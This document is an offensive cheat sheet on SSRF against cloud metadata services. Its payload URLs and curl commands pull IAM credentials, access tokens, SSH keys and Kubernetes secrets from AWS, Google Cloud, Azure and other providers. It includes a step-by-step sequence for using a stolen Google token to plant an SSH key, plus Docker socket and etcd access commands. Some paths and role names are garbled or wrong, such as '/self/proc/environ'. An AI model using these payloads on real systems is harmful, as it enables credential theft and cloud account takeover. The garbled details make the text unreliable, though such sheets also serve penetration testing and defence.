<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# SSRF In The Cloud

## Cloud Meta Data Service


The IP address ```169.254.169.254``` is used by AWS (EC2), Azure, Google, and DigitalOcean to bind the cloud provider's respective cloud metadata service to. This is used by cloud resources to query information about themselves. Some cloud providers will place constraints around this service. For example Google requires that the following header is included in all requests ```Metadata-Flavor: Google``` and refuses to accept requires with an ```X-Forwarded-For``` header set. AWS however does not place any constraints around requests.


### AWS

#### EC2

* This endpoint will return all of the roles that are attached to the current EC2 instance

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

* In AWS if a EC2 instance needed to access an S3 bucket, a role can be assigned to the EC2 instance so the instance can access the S3 bucket without hard coding credentials. AWS will assigned the EC2 instance credentials to access the S3 bucket that are rotated on a regular basis. The below endpoint can be used to dump the credentials that AWS assigned to the EC2 instance.

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME_HERE>
```

#### ECS

* ECS is a logical group of EC2 instances. It allows for running applications without have to scale the cluster management infrastructure since ECS manages that. The metadata endpoints are different for a service running in ECS.

* The following endpoint ```http://169.254.170.2/v2/credentials/<GUID>``` will contain credentials for the ECS machine. The GUID is stored an environment variable called ```AWS_CONTAINER_CREDENTIALS_RELATIVE_URI``` and can be found in ```/self/proc/environ```. The bellow commands will retrieve the AccessKey, SecretKey and token from the metadata service.

```
curl "http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```

#### Elastic Beanstalk

* The below URLs can be used to obtain the ```acccountId``` and ```region``` from the metadata service.

```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
``` 


* The below URL can be used to retrieve the ```AccessKeyId```, ```SecretAccessKey```, and ```Token``` from the metadata service.

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

* The credentials can then be used to access the S3 bucket with the below aws cli command.

```
aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/
```

* AWS Metadata Service Documentation: [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
* Ghostlulz SSRF AWS Credentials: [http://ghostlulz.com/ssrf-aws-credentials/](http://ghostlulz.com/ssrf-aws-credentials/)


### Google Cloud

* The metadata service for google cloud requires that either of the following headers be sent with requests ```Metadata-Flavor: Google``` or ```X-Google-Metadata-Request: True```

* Recursively Pull Data

```
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```
* Using ```v1beta1``` may bypass the header requirements 

```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

* Obtain the public SSH key

```
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
```

* Obtain the access token

```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

* Obtain the Kubernetes key

```
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
```


#### Steps to add an SSH key 

* Extract the token

```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

* Check the scope of the token

```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

# Example Response 
{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

* Use the token to push the SSH key to the to the google cloud server

```
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```


### Other Assorted Cloud Services

#### Digital Ocean

```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```

[https://developers.digitalocean.com/documentation/metadata/](https://developers.digitalocean.com/documentation/metadata/)


#### Packet Cloud

```
https://metadata.packet.net/userdata
```

#### Azure

* Need to have the header ```Metadata: true```

```
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

[https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)

[https://azure.microsoft.com/en-us/blog/announcing-general-availability-of-azure-instance-metadata-service/](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)

#### Oracle Cloud

```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

#### Alibaba

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

#### Rancher

```
curl http://rancher-metadata/<version>/<path>
```

#### Kubernetes ETCD

```
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

#### Docker

```
http://127.0.0.1:2375/v1.24/containers/jsonSimple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

